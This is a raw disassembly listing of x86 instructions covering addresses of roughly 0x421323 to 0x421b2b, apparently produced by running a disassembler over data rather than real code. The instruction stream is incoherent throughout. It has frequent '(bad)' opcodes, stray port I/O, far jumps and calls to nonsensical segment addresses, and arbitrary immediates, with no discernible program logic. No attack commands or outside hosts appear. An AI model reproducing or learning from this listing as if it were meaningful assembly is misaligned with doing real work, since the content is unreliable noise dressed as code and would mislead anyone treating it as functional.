  421323:	sbb    ah,BYTE PTR [ebp-0x55]
  421326:	lods   eax,DWORD PTR ds:[esi]
  421327:	add    DWORD PTR [bx+si-0x7c59],ebp
  42132c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42132d:	es push ds
  42132f:	rcl    BYTE PTR [edi],1
  421331:	sar    BYTE PTR ds:0x9ccffd8a,1
  421337:	test   eax,0x5ad03993
  42133c:	enter  0x2881,0x7
  421340:	add    al,0x9b
  421342:	and    eax,0xaadbf3c3
  421347:	push   ss
  421348:	test   BYTE PTR [edi],dh
  42134a:	cmp    ebx,DWORD PTR ds:0x2f3a35c3
  421350:	ins    BYTE PTR es:[edi],dx
  421351:	lds    ecx,FWORD PTR [ebp+0x41]
  421354:	(bad)  
  421356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421357:	dec    edi
  421358:	sub    ebx,DWORD PTR [edi+eax*2]
  42135b:	xchg   edx,eax
  42135c:	gs adc al,0x65
  42135f:	rol    DWORD PTR [ebx+0x4cfc5d44],1
  421365:	in     al,dx
  421366:	jnp    0x4212f7
  421368:	mov    esp,0x2ab19243
  42136d:	fld    DWORD PTR [esi+ebp*4+0x7dad4778]
  421374:	(bad)  
  421375:	int3   
  421376:	out    dx,al
  421377:	adc    eax,DWORD PTR [edx-0x28]
  42137a:	mov    esp,0x2dd382c
  42137f:	out    dx,al
  421380:	mov    eax,0xda081f3d
  421385:	ja     0x421332
  421387:	(bad)  
  421388:	jb     0x42130c
  42138a:	dec    edx
  42138b:	xor    edx,0x6c
  42138e:	adc    eax,0xd98e2040
  421393:	jmp    0x8dc30e6d
  421398:	in     al,0x99
  42139a:	clc    
  42139b:	in     eax,dx
  42139c:	rol    BYTE PTR [ebx+0x1],1
  42139f:	push   esi
  4213a0:	jmp    0xe393:0xbd7f5e51
  4213a7:	xchg   esi,eax
  4213a8:	mov    edx,0xe0bf35db
  4213ad:	and    DWORD PTR [edi],ebp
  4213af:	mov    bh,0x5f
  4213b1:	lea    edi,[ecx+0x3990a0c7]
  4213b7:	sub    cl,BYTE PTR [edx-0x3cd202e9]
  4213bd:	pop    ecx
  4213be:	jl     0x42138f
  4213c0:	test   BYTE PTR [ebp+0x356df7b7],bl
  4213c6:	adc    BYTE PTR [eax],bh
  4213c8:	pushf  
  4213c9:	fisttp QWORD PTR [edx+0x20]
  4213cc:	sar    esi,0xa4
  4213cf:	sub    ecx,DWORD PTR [eax]
  4213d1:	leave  
  4213d2:	pop    esp
  4213d3:	or     esi,edx
  4213d5:	adc    al,0x49
  4213d7:	mov    al,ds:0x3f06e034
  4213dc:	stos   DWORD PTR es:[edi],eax
  4213dd:	xchg   ebx,eax
  4213de:	fld    DWORD PTR [edi+0x4e61538b]
  4213e4:	inc    esp
  4213e5:	(bad)  
  4213e6:	pop    es
  4213e7:	pop    edx
  4213e8:	adc    al,0xa1
  4213ea:	out    dx,al
  4213eb:	iret   
  4213ec:	mov    edi,0x9a3530ad
  4213f1:	shl    DWORD PTR [edi],0xa3
  4213f4:	sbb    al,BYTE PTR [ebx]
  4213f6:	mov    al,0xc5
  4213f8:	fistp  QWORD PTR [edi]
  4213fa:	(bad)  
  4213fb:	std    
  4213fc:	sub    ecx,DWORD PTR ds:0x5cddc567
  421402:	mov    ch,0x99
  421404:	test   DWORD PTR [ecx-0x384ba8f0],0x88137ca8
  42140e:	push   edx
  42140f:	jecxz  0x421441
  421411:	repz adc al,0x9c
  421414:	jnp    0x4213cc
  421416:	stc    
  421417:	mov    cl,0xc6
  421419:	jmp    0xb9d55cf5
  42141e:	daa    
  42141f:	lock int3 
  421421:	mov    ds:0xd3686310,al
  421426:	mov    bh,0xbe
  421428:	mov    cl,0x72
  42142a:	adc    eax,0xb4533154
  42142f:	(bad)  
  421431:	mov    bh,0xbe
  421433:	in     al,0x6c
  421435:	adc    eax,0x230ad7fb
  42143a:	cmp    al,BYTE PTR [eax+0x56]
  42143d:	repz aaa 
  42143f:	les    eax,FWORD PTR [edx+0x2d]
  421442:	mov    ebp,DWORD PTR [edi-0x4f]
  421445:	sahf   
  421446:	cmp    eax,0x6851970a
  42144b:	ret    0x68ea
  42144e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42144f:	mov    ds:0x28adf66b,al
  421454:	jo     0x421472
  421456:	and    ebx,edx
  421458:	shr    BYTE PTR [esp+eax*8-0x14],1
  42145c:	mov    edx,0x899fca98
  421461:	xlat   BYTE PTR ds:[ebx]
  421462:	nop
  421463:	std    
  421464:	aas    
  421465:	push   ebx
  421466:	cmp    al,0xf
  421468:	scas   eax,DWORD PTR es:[edi]
  421469:	(bad)  
  42146a:	fs mov bl,0x28
  42146d:	xchg   ebp,eax
  42146e:	mov    ds:0x6f593b34,eax
  421473:	ins    BYTE PTR es:[edi],dx
  421474:	xchg   edx,eax
  421475:	xchg   ecx,eax
  421476:	or     DWORD PTR [edx+0x46],eax
  421479:	xchg   ecx,eax
  42147a:	pop    edi
  42147b:	mov    BYTE PTR [esi+0x4e],0xf7
  42147f:	leave  
  421480:	cmc    
  421481:	(bad)  
  421482:	or     eax,DWORD PTR [ebp-0x57]
  421485:	cs jge 0x421505
  421488:	jbe    0x4214e5
  42148a:	jns    0x421452
  42148c:	mov    bl,0xf0
  42148e:	scas   al,BYTE PTR es:[edi]
  42148f:	add    BYTE PTR [edi-0x75],dh
  421492:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421493:	add    ebp,esp
  421495:	xchg   ebx,eax
  421496:	call   0x0:0xa22a4f
	...
  421511:	add    BYTE PTR [eax],al
  421513:	add    BYTE PTR [eax+ebx*1-0x2923a928],bl
  42151a:	sahf   
  42151b:	fidivr DWORD PTR [esi-0x64]
  42151e:	add    al,ah
  421520:	sbb    eax,0x1d995587
  421525:	lods   eax,DWORD PTR ds:[esi]
  421526:	add    DWORD PTR [eax],eax
  421528:	outs   dx,BYTE PTR ds:[esi]
  421529:	pop    es
  42152a:	add    BYTE PTR [eax],al
  42152c:	xchg   esi,eax
  42152d:	sub    edi,ecx
  42152f:	mov    esi,DWORD PTR [edx+eax*4]
  421532:	(bad)  
  421533:	call   DWORD PTR [edi]
  421535:	lods   al,BYTE PTR ds:[esi]
  421536:	sub    al,0xa5
  421538:	add    ebp,DWORD PTR [esi]
  42153a:	and    eax,0x725f14d3
  42153f:	jns    0x421535
  421541:	lea    ebp,[ebp+ebx*2+0x3b]
  421545:	adc    esi,ebx
  421547:	and    eax,0x45c0ed3c
  42154c:	lahf   
  42154d:	mov    al,ds:0x6d227f14
  421552:	iret   
  421553:	gs into 
  421555:	repnz div ebx
  421558:	enter  0x8bae,0x10
  42155c:	pop    ds
  42155d:	mov    eax,ds:0x61b37ad0
  421562:	add    dh,BYTE PTR [esi]
  421564:	rcr    DWORD PTR [edi],1
  421566:	inc    eax
  421567:	aad    0x6b
  421569:	jmp    0x72ba0394
  42156e:	stc    
  42156f:	aaa    
  421570:	or     cl,BYTE PTR [ebx-0x5b]
  421573:	inc    esi
  421574:	push   ebx
  421575:	call   0xff2ab84e
  42157a:	mov    al,0xd2
  42157c:	inc    edi
  42157d:	push   ebx
  42157e:	jmp    0x421590
  421580:	loopne 0x421529
  421582:	dec    eax
  421583:	out    0x6f,al
  421585:	fcmovu st,st(7)
  421587:	in     eax,dx
  421588:	sub    al,0x5f
  42158a:	push   edx
  42158b:	sbb    esp,esp
  42158d:	out    0x37,eax
  42158f:	call   0x17ba83cd
  421594:	pop    es
  421595:	sti    
  421596:	cmc    
  421597:	stc    
  421598:	and    al,0x69
  42159a:	adc    ecx,DWORD PTR [ecx+0x25]
  42159d:	pop    ebx
  42159e:	and    BYTE PTR [esi-0x44c2774e],cl
  4215a4:	jle    0x42160d
  4215a6:	mov    bh,0x38
  4215a8:	push   esp
  4215a9:	sbb    eax,0x9fec3567
  4215ae:	es out 0x91,al
  4215b1:	cmp    DWORD PTR [esi+ebx*4-0x7],ebx
  4215b5:	(bad)  
  4215b6:	and    eax,esi
  4215b8:	and    BYTE PTR ds:0xf68592e7,0xfa
  4215bf:	test   BYTE PTR [ecx],0x98
  4215c2:	lods   eax,DWORD PTR ds:[esi]
  4215c3:	inc    edx
  4215c4:	push   cs
  4215c5:	in     al,dx
  4215c6:	repnz ins BYTE PTR es:[edi],dx
  4215c8:	cmp    DWORD PTR [edi+0x2d7efad1],edi
  4215ce:	cli    
  4215cf:	inc    ebp
  4215d0:	fbstp  TBYTE PTR [esi-0x47919f2f]
  4215d6:	retf   
  4215d7:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215d9:	xchg   BYTE PTR [eax+ebx*1-0x6a2616cc],bh
  4215e0:	cwde   
  4215e1:	push   esi
  4215e2:	sbb    eax,0x3f318923
  4215e7:	mov    BYTE PTR [ecx-0x229e2b18],ch
  4215ed:	pop    ebp
  4215ee:	push   edi
  4215ef:	das    
  4215f0:	push   0x521957b3
  4215f5:	lods   eax,DWORD PTR ds:[esi]
  4215f6:	into   
  4215f7:	cmp    DWORD PTR ds:0x592e0ad0,ecx
  4215fd:	adc    cl,0x6d
  421600:	aaa    
  421601:	test   BYTE PTR [ebp+edx*4+0x23],al
  421605:	rep stos BYTE PTR es:[edi],al
  421607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421608:	or     esi,ecx
  42160a:	outs   dx,BYTE PTR ds:[esi]
  42160b:	jmp    0xdc2e:0x22fbf215
  421612:	pop    eax
  421613:	sar    ecx,0x1c
  421616:	scas   eax,DWORD PTR es:[edi]
  421617:	lea    ecx,[ebx+0x2f1d5a31]
  42161d:	cmp    eax,0x778b1177
  421622:	mov    ch,0xd
  421624:	jne    0x421643
  421626:	add    bh,0x38
  421629:	add    al,0xa9
  42162b:	mov    cl,0x48
  42162d:	add    eax,0xd1745af3
  421632:	dec    edi
  421633:	(bad)  
  421634:	(bad)  
  421635:	sub    eax,0x18f6da68
  42163a:	ror    DWORD PTR [edx],0xff
  42163d:	aas    
  42163e:	jg     0x421684
  421640:	xlat   BYTE PTR ds:[ebx]
  421641:	or     eax,0x1b58eb0b
  421646:	stos   BYTE PTR es:[edi],al
  421647:	jl     0x421644
  421649:	int    0x76
  42164b:	pop    ds
  42164c:	imul   ecx,edi,0x45d182e
  421652:	add    dh,BYTE PTR [esi-0x37]
  421655:	daa    
  421656:	push   esi
  421657:	xchg   ecx,eax
  421658:	push   ebp
  421659:	inc    DWORD PTR [ebx]
  42165b:	mov    esi,0xbc28b265
  421660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421661:	out    0x8a,al
  421663:	dec    eax
  421664:	cli    
  421665:	into   
  421666:	sub    dl,cl
  421668:	xchg   ebx,eax
  421669:	and    BYTE PTR [ecx+eax*1-0x63],bh
  42166d:	test   BYTE PTR [ebp+0x2359d2c2],bl
  421673:	xchg   ebp,eax
  421674:	mov    ecx,DWORD PTR [ebx+0x5511cd26]
  42167a:	pop    es
  42167b:	xchg   edi,eax
  42167c:	jo     0x4216a9
  42167e:	add    al,0xf
  421680:	ins    BYTE PTR es:[edi],dx
  421681:	ds mov eax,0x7562d9c5
  421687:	dec    esp
  421688:	loopne 0x4216fc
  42168a:	sub    BYTE PTR [ecx+ebp*8+0x6cb8d295],dh
  421691:	inc    edi
  421692:	xchg   ebp,eax
  421693:	xchg   ebx,eax
  421694:	sub    DWORD PTR [ebp+0x2c157452],edi
  42169a:	and    bl,BYTE PTR [ecx]
  42169c:	out    0x98,eax
  42169e:	mov    ds:0x314d5924,al
  4216a3:	ret    0x4611
  4216a6:	cmp    ebp,DWORD PTR [ebx-0x8b2a79b]
  4216ac:	bound  ebp,QWORD PTR [ebp-0x28dac23]
  4216b2:	xor    BYTE PTR [edx+0x4c3132a],0x7b
  4216b9:	xchg   ebp,eax
  4216ba:	inc    bh
  4216bc:	mov    ebx,0xfdb86fd2
  4216c1:	(bad)  
  4216c2:	jne    0x421685
  4216c4:	fwait
  4216c5:	jl     0x4216ed
  4216c7:	or     al,0xde
  4216c9:	mov    ds:0x460d3096,eax
  4216ce:	ins    BYTE PTR es:[edi],dx
  4216cf:	lock xor al,0x99
  4216d2:	idiv   bh
  4216d4:	and    dh,BYTE PTR [esi+ecx*2+0x5f708cc6]
  4216db:	pushf  
  4216dc:	sub    bh,BYTE PTR [eax+0x47768d2]
  4216e2:	fisttp WORD PTR [eax+0x10]
  4216e5:	add    eax,DWORD PTR ds:0x83f54df1
  4216eb:	das    
  4216ec:	(bad)  
  4216ed:	mov    fs,WORD PTR [esp+edi*4-0x3d6c69fa]
  4216f4:	addr16 and cl,bh
  4216f7:	test   DWORD PTR [eax+0x45],edi
  4216fa:	ins    DWORD PTR es:[edi],dx
  4216fb:	stc    
  4216fc:	sbb    ah,BYTE PTR fs:[ecx]
  4216ff:	es push 0x4a
  421702:	pop    edi
  421703:	sbb    eax,DWORD PTR [eax]
  421705:	je     0x42169e
  421707:	rcl    DWORD PTR [edi+0x27129996],0xd0
  42170e:	add    ebx,DWORD PTR [esi-0x15321f24]
  421714:	mov    esi,0xe3e8eedd
  421719:	xor    BYTE PTR ds:0x2878ea3d,al
  42171f:	pop    esp
  421720:	mov    edx,0xda5668a2
  421725:	add    BYTE PTR ds:0x69af5ab3,ch
  42172b:	adc    ecx,DWORD PTR [eax+0x6aa5f8d]
  421731:	stos   BYTE PTR es:[edi],al
  421732:	in     al,dx
  421733:	pop    ss
  421734:	xor    al,0xc3
  421736:	jecxz  0x4216c9
  421738:	push   edi
  421739:	clc    
  42173a:	mov    dh,0xcf
  42173c:	xor    DWORD PTR [edx-0x48],edx
  42173f:	imul   esi,DWORD PTR [edi-0x51],0x50b8b291
  421746:	out    dx,al
  421747:	mov    dh,0xe6
  421749:	je     0x421754
  42174b:	dec    ebp
  42174c:	rep ins BYTE PTR es:[edi],dx
  42174e:	fist   WORD PTR [ebp+0x3d]
  421751:	sbb    DWORD PTR cs:[edi+esi*1-0x54],0x8f4b0000
  42175a:	es dec ebx
  42175c:	sub    al,0xc2
  42175e:	mov    eax,ds:0xa5f6958
  421763:	push   ecx
  421765:	dec    esp
  421766:	adc    BYTE PTR [ebp-0x4e],bl
  421769:	xchg   DWORD PTR [edi],ecx
  42176b:	dec    eax
  42176c:	dec    ebx
  42176d:	out    dx,al
  42176e:	(bad)  
  42176f:	mul    DWORD PTR [eax-0x27aa82c9]
  421775:	fs pop ebp
  421777:	xchg   edx,eax
  421778:	cmp    bh,BYTE PTR [edx]
  42177a:	inc    ecx
  42177b:	push   ebp
  42177c:	mov    edi,0xd542bf56
  421781:	push   ss
  421782:	lock push edx
  421784:	ret    
  421785:	inc    esi
  421786:	ins    DWORD PTR es:[edi],dx
  421787:	stc    
  421788:	les    esi,FWORD PTR [eax-0x29183806]
  42178e:	add    eax,0x21ebf192
  421793:	loopne 0x4217aa
  421795:	bound  ebp,QWORD PTR [edi]
  421797:	xor    ecx,DWORD PTR [ecx+ecx*2-0x7821abfd]
  42179e:	popf   
  42179f:	test   DWORD PTR [ebx],ebp
  4217a1:	and    al,0xc6
  4217a3:	fld    DWORD PTR [edx+0x79]
  4217a6:	aas    
  4217a7:	enter  0xbfa5,0x61
  4217ab:	fcom   QWORD PTR ds:0x1b78ff87
  4217b1:	sub    esp,DWORD PTR [edx]
  4217b3:	jle    0x42179a
  4217b5:	(bad)  [ecx]
  4217b7:	(bad)  
  4217b8:	sbb    DWORD PTR [ebx],ecx
  4217ba:	cmp    ax,0xdd78
  4217be:	push   es
  4217bf:	add    eax,0xffffffcd
  4217c2:	cmp    DWORD PTR [esp+eax*2+0x61],0x54
  4217c7:	push   esp
  4217c8:	xor    bl,BYTE PTR [esi*8+0x12aadeab]
  4217cf:	outs   dx,DWORD PTR ds:[esi]
  4217d0:	into   
  4217d1:	cmp    DWORD PTR gs:[ebx+0x43],0x7cf6a3fe
  4217d9:	lods   eax,DWORD PTR ds:[esi]
  4217da:	and    DWORD PTR [esi-0xe],edi
  4217dd:	and    al,0x46
  4217df:	ret    
  4217e0:	xlat   BYTE PTR es:[ebx]
  4217e2:	cmc    
  4217e3:	loopne 0x42177d
  4217e5:	jns    0x42184d
  4217e7:	rcl    dh,1
  4217e9:	xor    BYTE PTR [ecx],bl
  4217eb:	sti    
  4217ec:	push   edx
  4217ed:	mov    al,bl
  4217ef:	aad    0x65
  4217f1:	outs   dx,DWORD PTR ds:[esi]
  4217f2:	(bad)  
  4217f3:	test   eax,0xb47875cc
  4217f8:	jg     0x421845
  4217fa:	popa   
  4217fb:	sar    DWORD PTR [ecx-0x67e1be11],1
  421801:	xchg   esi,eax
  421802:	or     BYTE PTR [ecx+0x56],0x1f
  421806:	fild   WORD PTR [edx+edi*4]
  421809:	or     DWORD PTR [eax],edi
  42180b:	lods   al,BYTE PTR ds:[esi]
  42180c:	or     DWORD PTR [esi-0x718620db],0xd4a7090c
  421816:	jge    0x4217af
  421818:	je     0x4217e5
  42181a:	and    BYTE PTR [ebx+0x5cae005c],al
  421820:	aaa    
  421821:	add    ecx,ebx
  421823:	call   0x9a724a32
  421828:	push   eax
  421829:	stos   DWORD PTR es:[edi],eax
  42182a:	xor    ch,BYTE PTR [edx+0x5a]
  42182d:	xchg   esp,eax
  42182e:	xor    ch,al
  421830:	cmp    ebx,DWORD PTR [edx+0x7f344027]
  421836:	or     al,0x94
  421838:	xor    BYTE PTR [edi],dl
  42183a:	pusha  
  42183b:	and    BYTE PTR [edi-0x56],bl
  42183e:	shl    BYTE PTR [ecx],cl
  421840:	lea    esi,[esi]
  421842:	ins    BYTE PTR es:[di],dx
  421844:	syscall 
  421846:	add    DWORD PTR [edi+0x4ebc26a3],esp
  42184c:	or     al,BYTE PTR [ecx+0x63]
  42184f:	mov    ch,0xcf
  421851:	xchg   ecx,eax
  421852:	aas    
  421853:	and    esi,edi
  421855:	arpl   WORD PTR [edi-0x70],ax
  421858:	cmp    eax,0xe794f6eb
  42185d:	push   ds
  42185e:	mov    ds:0x92bd9e42,eax
  421863:	aas    
  421864:	mov    cl,0xe0
  421866:	loop   0x4217f1
  421868:	push   ecx
  421869:	pop    eax
  42186a:	fdivr  DWORD PTR [ecx+0x2b363f9a]
  421870:	mov    eax,ds:0x19e6e786
  421875:	adc    al,0xc4
  421877:	add    DWORD PTR [ecx-0xc65ba5f],edx
  42187d:	jnp    0x42186c
  42187f:	sti    
  421880:	pop    ebx
  421881:	xchg   ebx,eax
  421882:	test   al,ch
  421884:	sti    
  421885:	std    
  421886:	scas   eax,DWORD PTR es:[edi]
  421887:	push   esi
  421888:	xchg   edx,eax
  421889:	adc    al,0xbf
  42188c:	push   cs
  42188d:	or     eax,0x8cd7af77
  421892:	ret    0x2574
  421895:	(bad)  
  421896:	dec    ebp
  421897:	popa   
  421898:	je     0x42184b
  42189a:	jns    0x421903
  42189c:	sub    ecx,DWORD PTR [ecx]
  42189e:	sub    BYTE PTR [ebp-0x36],dh
  4218a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218a2:	jo     0x4218f0
  4218a4:	sbb    DWORD PTR [ebx-0x2ba96d69],esi
  4218aa:	dec    ebp
  4218ab:	mov    eax,esi
  4218ad:	jl     0x421900
  4218af:	push   esp
  4218b0:	test   DWORD PTR [esi+0x4d],eax
  4218b3:	nop
  4218b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218b5:	push   ds
  4218b6:	das    
  4218b7:	push   cs
  4218b8:	dec    ebx
  4218b9:	pusha  
  4218ba:	inc    esi
  4218bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218bc:	shr    BYTE PTR fs:[ebx],cl
  4218bf:	xchg   ebp,eax
  4218c0:	nop
  4218c1:	loopne 0x4218d7
  4218c3:	icebp  
  4218c4:	dec    ecx
  4218c5:	lock fwait
  4218c7:	lock lahf 
  4218c9:	repz cmc 
  4218cb:	call   0x854f:0x61c14b52
  4218d2:	jge    0x42186e
  4218d4:	inc    edi
  4218d5:	xchg   bl,ah
  4218d7:	mov    esi,DWORD PTR [edx-0x7a]
  4218da:	cs push edx
  4218dc:	into   
  4218dd:	adc    al,0x41
  4218df:	add    BYTE PTR [esi],bh
  4218e1:	pop    eax
  4218e2:	out    dx,al
  4218e3:	mov    ebp,eax
  4218e5:	push   eax
  4218e6:	mov    ss,edi
  4218e8:	mov    esp,0x50c79935
  4218ed:	fdiv   QWORD PTR [esi]
  4218ef:	retf   0x7a4
  4218f2:	add    cl,BYTE PTR [ebx-0x13]
  4218f5:	imul   ecx,esp,0xeb2ee65
  4218fb:	fsubr  DWORD PTR [edx-0x48]
  4218fe:	adc    eax,0x8a457dde
  421903:	pop    esi
  421904:	nop
  421905:	scas   eax,DWORD PTR es:[edi]
  421906:	jmp    0xb75eec84
  42190b:	shl    BYTE PTR [ebp-0x222c68fe],1
  421911:	adc    eax,0xe49fb491
  421916:	xor    dl,BYTE PTR [ebx]
  421918:	lea    esi,[ecx+0x20]
  42191b:	mov    bh,0x29
  42191d:	test   eax,0xb3abc8af
  421922:	rol    BYTE PTR [edx-0x35330f6b],0x76
  421929:	sti    
  42192a:	add    al,bl
  42192c:	stos   DWORD PTR es:[edi],eax
  42192d:	sahf   
  42192e:	add    dh,al
  421930:	mov    al,ds:0xbd6f6246
  421935:	mov    al,0xcc
  421937:	arpl   WORD PTR [ebx-0x25],dx
  42193a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42193b:	or     esi,DWORD PTR [ebp+0x9]
  42193e:	sub    DWORD PTR [esi+0x28],0xffffffe5
  421942:	stos   BYTE PTR es:[edi],al
  421943:	pop    ss
  421944:	jne    0x4218cc
  421946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421947:	jb     0x421917
  421949:	outs   dx,BYTE PTR ds:[esi]
  42194a:	cwde   
  42194b:	out    0xf2,al
  42194d:	push   ebp
  42194e:	outs   dx,DWORD PTR ds:[esi]
  42194f:	sub    BYTE PTR [edx+0x4b],bl
  421952:	mov    WORD PTR [esi],ds
  421954:	sbb    bh,BYTE PTR [ebx]
  421956:	xor    BYTE PTR [ecx+0x21],0x65
  42195a:	mov    dh,0xba
  42195c:	adc    al,0x50
  42195e:	ja     0x42190a
  421960:	repnz mov al,ds:0x35e372a2
  421966:	daa    
  421967:	imul   edi,DWORD PTR ds:0xa845ed6a,0x69f12dce
  421971:	scas   al,BYTE PTR es:[edi]
  421972:	push   ds
  421973:	pop    ecx
  421974:	inc    ecx
  421975:	sbb    eax,0x48aec754
  42197a:	push   cs
  42197b:	clc    
  42197c:	cmp    bh,BYTE PTR ds:0x82e14f02
  421982:	pop    ebx
  421983:	in     eax,0x4a
  421985:	push   esp
  421986:	xchg   edi,eax
  421987:	mov    ah,0x58
  421989:	adc    DWORD PTR [eax],ecx
  42198b:	push   eax
  42198c:	jmp    0x4219e7
  42198e:	aam    0x92
  421990:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421991:	adc    DWORD PTR [ecx+0x53fcb90f],esi
  421997:	dec    esp
  421998:	pop    esp
  421999:	cli    
  42199a:	lea    esi,[edx+0x4f6a1cf1]
  4219a0:	jno    0x42196a
  4219a2:	pop    eax
  4219a3:	popa   
  4219a4:	lea    edx,[ebp+0x6e53c23a]
  4219aa:	mov    ah,0xdd
  4219ac:	pushf  
  4219ad:	dec    esp
  4219ae:	pushf  
  4219af:	or     DWORD PTR [esi-0x228888f5],esi
  4219b5:	lahf   
  4219b6:	aam    0xba
  4219b8:	bound  ecx,QWORD PTR [edi]
  4219ba:	cmp    ebx,DWORD PTR [eax-0x52]
  4219bd:	sub    eax,0x8ed4c013
  4219c2:	into   
  4219c3:	pop    esi
  4219c4:	nop
  4219c5:	sbb    DWORD PTR [ecx],edx
  4219c7:	test   DWORD PTR [edi+0x33136808],esp
  4219cd:	jns    0x4219c5
  4219cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219d0:	mov    eax,ds:0x79e2f47e
  4219d5:	daa    
  4219d6:	(bad)  
  4219d7:	jno    0x4219e3
  4219d9:	stc    
  4219da:	and    eax,0x3dd1cc64
  4219df:	jmp    0x9fd813a4
  4219e4:	xlat   BYTE PTR ds:[ebx]
  4219e5:	push   ebp
  4219e6:	mov    DWORD PTR ds:0x8935a358,ebp
  4219ec:	(bad)  
  4219ed:	fdivr  DWORD PTR [eax+ebp*2+0x8dedabb]
  4219f4:	mov    eax,ds:0x9094684
  4219f9:	mov    bl,0x14
  4219fb:	xchg   esp,eax
  4219fc:	inc    ebx
  4219fd:	(bad)  
  4219fe:	fisttp QWORD PTR ds:0x41418c84
  421a04:	hlt    
  421a05:	inc    edx
  421a06:	ds mov bl,0xd4
  421a09:	scas   al,BYTE PTR es:[edi]
  421a0a:	xchg   edx,esi
  421a0c:	add    DWORD PTR [edi],0x7603ec99
  421a12:	mov    ds:0xa3ba3469,al
  421a17:	lea    edx,[edx-0x15bda4e0]
  421a1d:	mov    DWORD PTR ds:0x4e8843c6,ebp
  421a23:	scas   al,BYTE PTR es:[edi]
  421a24:	fistp  QWORD PTR [ecx+edi*2-0x739a0638]
  421a2b:	test   DWORD PTR [esi-0x5b],ecx
  421a2e:	jb     0x421a66
  421a30:	lods   al,BYTE PTR ds:[esi]
  421a31:	push   ds
  421a32:	jl     0x4219f6
  421a34:	and    BYTE PTR [ecx],bh
  421a36:	scas   al,BYTE PTR es:[edi]
  421a37:	mov    bh,0xbb
  421a39:	mov    edi,0x530fc666
  421a3e:	fwait
  421a3f:	ret    
  421a40:	jge    0x421a24
  421a42:	fst    QWORD PTR [edi-0x1d]
  421a45:	shl    esp,0x61
  421a48:	ins    BYTE PTR es:[edi],dx
  421a49:	sahf   
  421a4a:	and    edx,edx
  421a4c:	xor    ebx,DWORD PTR ds:0x4b58b810
  421a52:	rcl    DWORD PTR [eax+ebx*4],0xa8
  421a56:	pop    ds
  421a57:	mov    ebx,0x9411272c
  421a5c:	aaa    
  421a5d:	and    edi,ebp
  421a5f:	mov    ebp,0xea60648f
  421a64:	aad    0xe6
  421a66:	jecxz  0x421a42
  421a68:	or     BYTE PTR [esi-0x155c67b8],dl
  421a6e:	stos   DWORD PTR es:[edi],eax
  421a6f:	out    0xc3,eax
  421a71:	pop    ebp
  421a72:	inc    esi
  421a73:	cmc    
  421a74:	ins    DWORD PTR es:[edi],dx
  421a75:	cmc    
  421a76:	jmp    0x845de274
  421a7b:	repz jne 0x421a45
  421a7e:	push   esp
  421a7f:	sub    ch,ch
  421a81:	dec    edx
  421a82:	inc    ecx
  421a83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a84:	push   ebp
  421a85:	sub    BYTE PTR [ebp+0x21],cl
  421a88:	js     0x421a3c
  421a8a:	sbb    esi,esp
  421a8c:	dec    edi
  421a8d:	fmul   st(4),st
  421a8f:	pop    ebp
  421a90:	sbb    eax,0xcafaa1a3
  421a95:	push   ds
  421a96:	shl    edi,0xc1
  421a99:	stos   DWORD PTR es:[edi],eax
  421a9a:	push   esi
  421a9b:	(bad)  
  421a9c:	int    0xbd
  421a9e:	nop
  421a9f:	cmp    ch,BYTE PTR [esi+ecx*2]
  421aa2:	xchg   esp,eax
  421aa3:	sub    ecx,DWORD PTR [ebx]
  421aa5:	test   eax,0x556149e8
  421aaa:	adc    al,0x2b
  421aac:	leave  
  421aad:	test   BYTE PTR [esp+esi*4+0x45],bh
  421ab1:	cld    
  421ab2:	mov    ch,0xda
  421ab4:	cwde   
  421ab5:	cs pop edi
  421ab7:	mov    ch,0x9a
  421ab9:	add    al,0x75
  421abb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421abc:	(bad)  
  421abd:	adc    ch,ah
  421abf:	adc    cl,BYTE PTR [ecx]
  421ac1:	jge    0x421a8d
  421ac3:	retf   0xcc52
  421ac6:	clc    
  421ac7:	push   cs
  421ac8:	jl     0x421a9a
  421aca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421acb:	push   esp
  421acc:	repnz push ebp
  421ace:	or     al,0x4d
  421ad0:	(bad)  
  421ad1:	jmp    0x421ac5
  421ad3:	xor    al,0x76
  421ad5:	xchg   esp,eax
  421ad6:	add    DWORD PTR [eax-0x12],0xffffffa9
  421ada:	(bad)  
  421adb:	fdiv   QWORD PTR [edx-0x7d]
  421ade:	test   DWORD PTR [ebp-0x7b],ebp
  421ae1:	inc    ecx
  421ae2:	xchg   DWORD PTR [eax-0x7d],ebx
  421ae5:	add    DWORD PTR [ebx],ebp
  421ae7:	mov    ebx,0xb3ca532f
  421aec:	ins    BYTE PTR es:[edi],dx
  421aed:	shr    DWORD PTR [esi+0xf],1
  421af0:	add    DWORD PTR [edx+0x26],edx
  421af3:	mov    ebx,0x5fe7fb12
  421af8:	out    0x5f,al
  421afa:	fcmovnb st,st(0)
  421afc:	xchg   ecx,eax
  421afd:	cwde   
  421afe:	dec    edi
  421aff:	test   BYTE PTR [edi-0x9],bh
  421b02:	call   0x1de9:0xa7b6477b
  421b09:	jne    0x421adb
  421b0b:	xor    ebx,DWORD PTR [esi-0x1b]
  421b0e:	add    al,0x22
  421b10:	out    dx,eax
  421b11:	arpl   ax,bx
  421b13:	pop    esp
  421b14:	cmp    al,0x12
  421b16:	(bad)  
  421b17:	outs   dx,DWORD PTR ds:[esi]
  421b18:	cmp    dh,BYTE PTR [edi]
  421b1a:	sub    BYTE PTR [esi+0x43],dh
  421b1d:	(bad)  
  421b1e:	rcr    ecx,cl
  421b20:	outs   dx,DWORD PTR ds:[esi]
  421b21:	mov    bl,0xdb
  421b23:	add    bh,BYTE PTR [edx+0x6f]
  421b26:	(bad)  
  421b27:	rol    BYTE PTR [edi+ecx*2+0x61],cl
  421b2b:	pop    ds
